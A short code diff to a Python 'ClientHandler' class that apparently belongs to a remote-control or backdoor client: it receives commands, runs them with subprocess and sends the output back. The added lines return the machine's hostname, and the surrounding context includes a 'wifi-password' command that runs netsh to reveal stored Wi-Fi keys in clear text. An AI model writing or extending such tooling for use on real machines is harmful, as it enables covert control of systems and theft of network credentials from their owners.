@@ -154,6 +154,13 @@ class ClientHandler:
                         result = "Still unavailable on linux"
                     self.send_data(result.encode())
                 
+                elif cmd == "hostname":
+                    if os_name=="Windows":
+                        result = subprocess.run("hostname", shell=True, capture_output=True, text=True).stdout
+                    else:
+                        result = subprocess.run("hostnamectl", shell=True, capture_output=True, text=True).stdout
+                    self.send_data(result.encode())
+                
                 elif cmd.startswith("wifi-password "):
                     wifi_network = cmd.split(" ",1)[1]
                     command = f'netsh wlan show profile "{wifi_network}" key=clear'
